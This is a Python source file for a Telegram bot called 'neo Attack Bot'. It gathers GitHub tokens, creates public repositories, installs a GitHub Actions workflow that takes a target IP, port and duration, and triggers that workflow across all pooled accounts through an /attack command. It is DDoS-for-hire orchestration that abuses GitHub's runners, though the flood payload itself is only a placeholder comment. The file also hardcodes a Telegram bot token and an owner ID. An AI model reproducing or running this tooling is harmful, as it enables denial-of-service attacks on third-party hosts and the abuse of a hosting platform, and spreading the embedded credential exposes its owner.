import os
import json
import random
import string
import requests
import asyncio
import base64
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from datetime import datetime

# Config
BOT_TOKEN = "8459637535:AAECvpNlPsEnxNChKUB_TRRxThGycLUf1pE"
ACCOUNTS_FILE = "accounts.json"

# Load admin IDs
def load_admin_ids():
    try:
        if os.path.exists("admin_ids.json"):
            with open("admin_ids.json", 'r') as f:
                data = json.load(f)
                return data.get("admin_ids", [7769457936])
    except:
        pass
    return [7769457936]

ADMIN_IDS = load_admin_ids()

class GitHubManager:
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }
        self.username = self.get_username()

    def get_username(self):
        try:
            response = requests.get("https://api.github.com/user", headers=self.headers)
            return response.json()['login'] if response.status_code == 200 else "unknown"
        except:
            return "unknown"

    def create_random_repo(self, prefix="attack"):
        repo_name = f"{prefix}{''.join(random.choices(string.digits, k=8))}"
        url = "https://api.github.com/user/repos"
        data = {
            "name": repo_name,
            "description": "Auto-generated attack repository",
            "auto_init": True,
            "private": False
        }
        response = requests.post(url, json=data, headers=self.headers)
        return repo_name if response.status_code == 201 else None

    def setup_workflow(self, repo_name):
        workflow_content = """name: Attack Workflow

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP'
        required: true
        type: string
      target_port:
        description: 'Target Port'
        required: true
        type: string
      attack_duration:
        description: 'Attack Duration (seconds)'
        required: true
        type: string

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Run attack
        run: |
          echo "Attack launched on ${{ inputs.target_ip }}:${{ inputs.target_port }} for ${{ inputs.attack_duration }} seconds"
          # Add your attack script here
"""

        url = f"https://api.github.com/repos/{self.username}/{repo_name}/contents/.github/workflows/attack.yml"
        
        data = {
            "message": "Add attack workflow",
            "content": base64.b64encode(workflow_content.encode()).decode()
        }
        
        response = requests.put(url, json=data, headers=self.headers)
        print(f"Workflow create status: {response.status_code}")
        if response.status_code != 201:
            print(f"Workflow error: {response.text}")
        return response.status_code == 201

    def trigger_workflow(self, repo_name, ip, port, duration):
        url = f"https://api.github.com/repos/{self.username}/{repo_name}/actions/workflows/attack.yml/dispatches"
        data = {
            "ref": "main",
            "inputs": {
                "target_ip": ip,
                "target_port": port,
                "attack_duration": duration
            }
        }
        response = requests.post(url, json=data, headers=self.headers)
        return response.status_code == 204

class AttackBot:
    def __init__(self):
        self.accounts = []
        self.load_accounts()

    def load_accounts(self):
        try:
            if os.path.exists(ACCOUNTS_FILE):
                with open(ACCOUNTS_FILE, 'r') as f:
                    data = json.load(f)
                    self.accounts = data.get('accounts', [])
        except Exception as e:
            print(f"Error loading accounts: {e}")
            self.accounts = []

    def save_accounts(self):
        try:
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump({"accounts": self.accounts}, f, indent=2)
        except Exception as e:
            print(f"Error saving accounts: {e}")

    def is_valid_ip(self, ip):
        parts = ip.split('.')
        if len(parts) != 4: return False
        for part in parts:
            if not part.isdigit() or not 0 <= int(part) <= 255: return False
        return True

    def is_valid_input(self, ip, port, duration):
        if not self.is_valid_ip(ip): return False
        if not port.isdigit() or not 1 <= int(port) <= 65535: return False
        if not duration.isdigit() or not 1 <= int(duration) <= 300: return False
        return True

def is_admin(user_id):
    return user_id in ADMIN_IDS

async def admin_only(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Admins only!")

bot_manager = AttackBot()

# Commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id):
        text = """neo Attack Bot - ADMIN MODE

**Admin Commands:**
/addaccount <token> [prefix] - Add GitHub account
/addtoken <token> [prefix] - Add token (same as addaccount)
/accounts - List accounts  
/removeaccount <number> - Remove account
/attack <ip> <port> <duration> - Launch attack
/addadmin <user_id> - Add admin
/stats - Show stats
/broadcast <message> - Broadcast

**Example:**
/addtoken ghp_abc123 neo
/attack 1.1.1.1 80 60

Each account = 5 instances"""
    else:
        text = """neo Attack Bot

**Commands:**
/accounts - List accounts
/attack <ip> <port> <duration> - Launch attack
/stats - Show stats

**Example:**
/attack 1.1.1.1 80 60

Multiple GitHub accounts combined!"""
    
    await update.message.reply_text(text)

async def add_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await add_token(update, context)

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await admin_only(update, context)
        return

    if len(context.args) < 1:
        await update.message.reply_text("**Usage:** /addtoken <github_token> [prefix]\nEx: /addtoken ghp_abc123 neon ai")
        return

    token = context.args[0]
    prefix = context.args[1] if len(context.args) > 1 else "attack"

    if len(prefix) > 10:
        await update.message.reply_text("Prefix too long! Max 10 chars.")
        return

    try:
        msg = await update.message.reply_text("Setting up account...")

        gh_manager = GitHubManager(token)
        
        await msg.edit_text("Creating repo...")
        repo_name = gh_manager.create_random_repo(prefix)
        
        if not repo_name:
            await msg.edit_text("Failed to create repo! Check token.")
            return

        await msg.edit_text("Setting up workflow...")
        if not gh_manager.setup_workflow(repo_name):
            await msg.edit_text("Failed to setup workflow! Check token permissions.")
            return

        new_account = {
            "username": gh_manager.username,
            "token": token,
            "repo_name": repo_name,
            "prefix": prefix,
            "status": "active",
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "added_by": user_id
        }

        bot_manager.accounts.append(new_account)
        bot_manager.save_accounts()

        text = f"""**Account Added!**

{gh_manager.username}
{repo_name}
{prefix}
5 instances

Total: {len(bot_manager.accounts) * 5} instances"""
        await msg.edit_text(text)

    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_manager.accounts:
        await update.message.reply_text("No accounts! Use /addtoken first.")
        return

    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)

    text = "**Connected Accounts:**\n\n"
    total = 0

    for i, acc in enumerate(bot_manager.accounts, 1):
        text += f"{i}. **{acc['username']}**\n"
        text += f"{acc['repo_name']}\n"
        text += f"5 instances\n"
        if is_admin_user:
            text += f"{acc.get('added_by', 'Unknown')}\n"
        text += "\n"
        total += 5

    text += f"**Total Power:** {total} instances, {len(bot_manager.accounts)} accounts"
    
    await update.message.reply_text(text)

async def remove_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await admin_only(update, context)
        return

    if not bot_manager.accounts:
        await update.message.reply_text("No accounts to remove!")
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("**Usage:** /removeaccount <number>\nEx: /removeaccount 1")
        return

    acc_num = int(context.args[0])
    if acc_num < 1 or acc_num > len(bot_manager.accounts):
        await update.message.reply_text(f"Invalid number! Use 1-{len(bot_manager.accounts)}")
        return

    removed = bot_manager.accounts.pop(acc_num - 1)
    bot_manager.save_accounts()

    await update.message.reply_text(
        f"**Account Removed!**\n\n"
        f"{removed['username']}\n"
        f"{removed['repo_name']}\n"
        f"Left: {len(bot_manager.accounts)}"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_manager.accounts:
        await update.message.reply_text("No accounts! Use /addtoken first.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("**Usage:** /attack <ip> <port> <duration>\nEx: /attack 1.1.1.1 80 60")
        return

    ip, port, duration = context.args

    if not bot_manager.is_valid_input(ip, port, duration):
        await update.message.reply_text("Invalid input!\n- IP: valid format\n- Port: 1-65535\n- Duration: 1-300s")
        return

    total_acc = len(bot_manager.accounts)
    total_inst = total_acc * 5
    user_name = update.effective_user.first_name

    msg = await update.message.reply_text(
        f"**Launching Attack...**\n\n"
        f"{ip}:{port}\n"
        f"{duration}s\n"
        f"0/{total_acc} accounts\n"
        f"0/{total_inst} instances\n"
        f"{user_name}"
    )

    success = 0
    failed = []

    for account in bot_manager.accounts:
        try:
            gh_manager = GitHubManager(account['token'])
            if gh_manager.trigger_workflow(account['repo_name'], ip, port, duration):
                success += 1
                status = f"{success}/{total_acc}"
            else:
                failed.append(account['username'])
                status = f"{success}/{total_acc}"
            
            await msg.edit_text(
                f"**Launching Attack...**\n\n"
                f"{ip}:{port}\n"
                f"{duration}s\n"
                f"{status} accounts\n"
                f"{success * 5}/{total_inst} instances\n"
                f"{user_name}"
            )
            
            await asyncio.sleep(0.5)
            
        except Exception as e:
            failed.append(account['username'])
            print(f"Failed for {account['username']}: {e}")

    if success > 0:
        text = f"""**ATTACK LAUNCHED!**

{ip}:{port}
{duration}s
{success}/{total_acc} accounts
{success * 5} instances
{user_name}

**FIREPOWER DEPLOYED!**"""
        
        if failed:
            text += f"\n\nFailed: {', '.join(failed)}"
    else:
        text = "**All attacks failed!** Check tokens."

    await msg.edit_text(text)

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_IDS[0]:
        await update.message.reply_text("Only owner can add admins!")
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await update.message.reply_text("**Usage:** /addadmin <user_id>\nEx: /addadmin 123456789")
        return

    new_id = int(context.args[0])
    
    if new_id in ADMIN_IDS:
        await update.message.reply_text("Already admin!")
        return

    ADMIN_IDS.append(new_id)
    with open("admin_ids.json", "w") as f:
        json.dump({"admin_ids": ADMIN_IDS}, f)
    
    await update.message.reply_text(f"**New Admin!**\n\nID: {new_id}\nTotal: {len(ADMIN_IDS)}")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_acc = len(bot_manager.accounts)
    total_inst = total_acc * 5
    
    user_id = update.effective_user.id
    is_admin_user = is_admin(user_id)
    
    if is_admin_user:
        text = f"""**neo Stats - ADMIN**

{total_acc} accounts
{total_inst} instances
{len(ADMIN_IDS)} admins
{total_inst} max power

Ready for action!"""
    else:
        text = f"""**neo Stats**

{total_acc} accounts
{total_inst} instances
{total_inst} max power

Ready to attack!"""
    
    await update.message.reply_text(text)

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await admin_only(update, context)
        return

    if not context.args:
        await update.message.reply_text("**Usage:** /broadcast <message>")
        return

    message = " ".join(context.args)
    await update.message.reply_text(f"**Broadcast Sent!**\n\n{message}")

def main():
    global ADMIN_IDS
    ADMIN_IDS = load_admin_ids()
    
    app = Application.builder().token(BOT_TOKEN).build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addaccount", add_account))
    app.add_handler(CommandHandler("addtoken", add_token))
    app.add_handler(CommandHandler("accounts", list_accounts))
    app.add_handler(CommandHandler("removeaccount", remove_account))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("addadmin", add_admin))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("help", start))

    print("neo Bot running...")
    print(f"Admins: {ADMIN_IDS}")
    app.run_polling()

if __name__ == "__main__":
    main()